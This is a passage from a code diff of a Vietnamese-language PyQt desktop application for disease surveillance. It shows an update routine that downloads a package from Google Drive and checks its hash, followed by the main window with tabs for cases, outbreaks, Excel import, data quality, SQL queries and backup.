+            cache_dir = core.UPDATE_CACHE_DIR
+            zip_path = cache_dir / info.file_name
+            progress = QProgressDialog("Đang tải bản cập nhật từ Google Drive...", "Hủy", 0, 100, self)
+            progress.setWindowTitle("Cập nhật ứng dụng")
+            progress.setWindowModality(Qt.WindowModality.WindowModal)
+            progress.setMinimumDuration(0)
+
+            def on_progress(downloaded: int, total: int | None):
+                if progress.wasCanceled():
+                    raise update_manager.UpdateError("Đã hủy tải bản cập nhật.")
+                if total:
+                    progress.setMaximum(100)
+                    progress.setValue(min(99, int(downloaded * 100 / total)))
+                else:
+                    progress.setMaximum(0)
+                QApplication.processEvents()
+
+            update_manager.download_drive_file(info.release_file_id, zip_path, on_progress, timeout=180)
+            progress.setLabelText("Đang kiểm tra tính toàn vẹn của gói cập nhật...")
+            progress.setMaximum(0)
+            QApplication.processEvents()
+            update_manager.verify_download(zip_path, info.sha256)
+            progress.close()
+            self.update_status.setText(
+                f"Đã tải phiên bản {info.version}. CSDL đã sao lưu tại {backup_path.name}."
+            )
+            update_manager.launch_update_and_exit(zip_path, core.BASE_DIR, info.package_root)
+            QApplication.quit()
+        except Exception as exc:
+            try:
+                progress.close()
+            except Exception:
+                pass
+            self.update_status.setText(f"Cập nhật chưa hoàn tất: {exc}")
+            QMessageBox.critical(self, "Không thể cập nhật", str(exc))
+
+
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle(APP_TITLE)
+        self.resize(1500, 900)
+        toolbar = QToolBar()
+        toolbar.setMovable(False)
+        toolbar.addWidget(QLabel("CDC • GIÁM SÁT DỊCH BỆNH"))
+        self.addToolBar(toolbar)
+        self.tabs = QTabWidget()
+        self.dashboard = DashboardTab()
+        self.cases = RecordsTab("case")
+        self.outbreaks = RecordsTab("outbreak")
+        self.quality = QualityTab()
+        self.import_tab = ImportTab(self.refresh_all)
+        self.sql = SqlTab()
+        self.settings = SettingsTab()
+        self.tabs.addTab(self.dashboard, "Tổng quan")
+        self.tabs.addTab(self.cases, "Ca bệnh")
+        self.tabs.addTab(self.outbreaks, "Ổ dịch")
+        self.tabs.addTab(self.import_tab, "Nhập Excel")
+        self.tabs.addTab(self.quality, "Chất lượng dữ liệu")
+        self.tabs.addTab(self.sql, "Truy vấn SQL")
+        self.tabs.addTab(self.settings, "Sao lưu & cập nhật")
+        self.tabs.currentChanged.connect(self.on_tab_changed)
+        self.setCentralWidget(self.tabs)
+        self.statusBar().showMessage(f"CSDL: {core.DB_PATH}")
+        QTimer.singleShot(1800, lambda: self.settings.check_update(silent=True))
+
+    def refresh_all(self):
+        self.dashboard.refresh()
+        self.cases.refresh_filters()
+        self.cases.refresh()
+        self.outbreaks.refresh_filters()
+        self.outbreaks.refresh()
+        self.quality.refresh()
+
+    def on_tab_changed(self, index: int):
+        widget = self.tabs.widget(index)
+        if hasattr(widget, "refresh"):
+            try:
+                widget.refresh()
+            except Exception:
+                pass
+
+
+def main() -> int:
+    core.init_db()
+    app = QApplication(sys.argv)
+    app.setApplicationName(core.APP_NAME)
+    app.setStyleSheet(APP_STYLE)
+    window = MainWindow()
+    window.show()
+    return app.exec()
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
